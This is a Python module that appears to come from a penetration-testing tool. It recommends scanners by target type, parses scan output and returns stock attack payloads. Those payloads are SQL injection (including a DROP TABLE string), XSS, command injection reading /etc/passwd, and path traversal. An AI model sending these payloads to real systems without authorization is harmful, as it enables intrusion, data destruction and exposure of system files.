#!/usr/bin/env python3
"""
Local AI provider for HackAI Enhanced (Offline)
"""

import json
import re
from typing import Dict, List, Any
from ai.base import BaseAIProvider
from core.models import AIAnalysis

class LocalAIProvider(BaseAIProvider):
    """Local AI provider using rule-based analysis"""
    
    def _initialize(self):
        """Initialize local AI provider"""
        self.available = True
        self.rules = self._load_rules()
    
    def _load_rules(self) -> Dict[str, Any]:
        """Load analysis rules"""
        return {
            "web_application": {
                "tools": ["nmap", "nuclei", "gobuster", "sqlmap", "nikto", "wpscan"],
                "strategy": "Start with port scanning, then web enumeration and vulnerability scanning",
                "precautions": "Ensure you have permission to test this target"
            },
            "network": {
                "tools": ["nmap", "masscan", "rustscan", "zmap"],
                "strategy": "Network discovery followed by service enumeration and vulnerability assessment",
                "precautions": "Verify network scope and authorization"
            },
            "api": {
                "tools": ["nuclei", "arjun", "postman", "insomnia"],
                "strategy": "API endpoint discovery, parameter analysis, and security testing",
                "precautions": "Check rate limits and API terms of service"
            },
            "mobile": {
                "tools": ["mobsf", "apktool", "dex2jar"],
                "strategy": "Static analysis, dynamic testing, and vulnerability assessment",
                "precautions": "Ensure proper app permissions and testing environment"
            }
        }
    
    async def analyze_target(self, target: str) -> Dict[str, Any]:
        """Analyze target using local rules"""
        target_type = self._detect_target_type(target)
        risk_assessment = self._assess_risk(target, target_type)
        
        return {
            "target_type": target_type,
            "risk_assessment": risk_assessment,
            "recommended_tools": self.rules.get(target_type, {}).get("tools", ["nmap"]),
            "testing_strategy": self.rules.get(target_type, {}).get("strategy", "Standard security assessment"),
            "precautions": self.rules.get(target_type, {}).get("precautions", "Ensure proper authorization")
        }
    
    async def interpret_results(self, tool: str, output: str, target: str) -> AIAnalysis:
        """Interpret scan results using local rules"""
        findings = self._extract_findings(tool, output)
        risk_level = self._assess_output_risk(tool, output)
        recommendations = self._generate_recommendations(tool, findings, risk_level)
        
        return AIAnalysis(
            summary=f"Local analysis of {tool} results for {target}",
            findings=findings,
            recommendations=recommendations,
            risk_level=risk_level,
            confidence=0.7,  # Local analysis confidence
            model_used="local-rules"
        )
    
    async def generate_payloads(self, attack_type: str, target_info: Dict[str, Any]) -> List[str]:
        """Generate attack payloads using local rules"""
        payloads = {
            "sql_injection": [
                "' OR 1=1--",
                "'; DROP TABLE users--",
                "' UNION SELECT NULL--",
                "admin'--",
                "1' AND '1'='1"
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//"
            ],
            "command_injection": [
                "; ls -la",
                "| whoami",
                "&& cat /etc/passwd",
                "`id`",
                "$(whoami)"
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
            ]
        }
        
        return payloads.get(attack_type, [f"Basic {attack_type} payload"])
    
    def is_available(self) -> bool:
        """Check if local AI is available"""
        return self.available
    
    def get_models(self) -> List[str]:
        """Get available local models"""
        return ["local-rules", "pattern-matching"]
    
    def _detect_target_type(self, target: str) -> str:
        """Detect target type based on URL/domain patterns"""
        if target.startswith(('http://', 'https://')):
            return "web_application"
        elif re.match(r'^\d+\.\d+\.\d+\.\d+$', target):
            return "network"
        elif 'api' in target.lower() or target.endswith('/api'):
            return "api"
        elif target.endswith(('.apk', '.ipa')):
            return "mobile"
        else:
            return "web_application"  # Default
    
    def _assess_risk(self, target: str, target_type: str) -> str:
        """Assess risk level based on target characteristics"""
        if target_type == "network":
            return "high"
        elif target_type == "api":
            return "medium"
        else:
            return "medium"
    
    def _extract_findings(self, tool: str, output: str) -> List[str]:
        """Extract security findings from tool output"""
        findings = []
        
        # Common vulnerability patterns
        vuln_patterns = {
            "nmap": [
                r"VULNERABLE",
                r"open port",
                r"service detected"
            ],
            "nuclei": [
                r"\[(critical|high|medium|low)\]",
                r"vulnerability found"
            ],
            "sqlmap": [
                r"sql injection",
                r"parameter.*injectable"
            ],
            "nikto": [
                r"found",
                r"vulnerability"
            ]
        }
        
        patterns = vuln_patterns.get(tool, [])
        for pattern in patterns:
            matches = re.findall(pattern, output, re.IGNORECASE)
            findings.extend(matches)
        
        if not findings:
            findings = ["No obvious vulnerabilities detected"]
        
        return findings[:5]  # Limit to 5 findings
    
    def _assess_output_risk(self, tool: str, output: str) -> str:
        """Assess risk level based on tool output"""
        output_lower = output.lower()
        
        if any(word in output_lower for word in ["critical", "vulnerable", "exploit"]):
            return "critical"
        elif any(word in output_lower for word in ["high", "dangerous", "severe"]):
            return "high"
        elif any(word in output_lower for word in ["medium", "warning", "caution"]):
            return "medium"
        else:
            return "low"
    
    def _generate_recommendations(self, tool: str, findings: List[str], risk_level: str) -> List[str]:
        """Generate recommendations based on findings and risk level"""
        recommendations = []
        
        if risk_level in ["critical", "high"]:
            recommendations.append("Immediate action required")
            recommendations.append("Consider temporary mitigation measures")
        
        if "sql injection" in str(findings).lower():
            recommendations.append("Implement input validation and parameterized queries")
        
        if "xss" in str(findings).lower():
            recommendations.append("Implement output encoding and CSP headers")
        
        if "open port" in str(findings).lower():
            recommendations.append("Review and close unnecessary open ports")
        
        if not recommendations:
            recommendations = ["Continue monitoring", "Implement security best practices"]
        
        return recommendations[:5]  # Limit to 5 recommendations
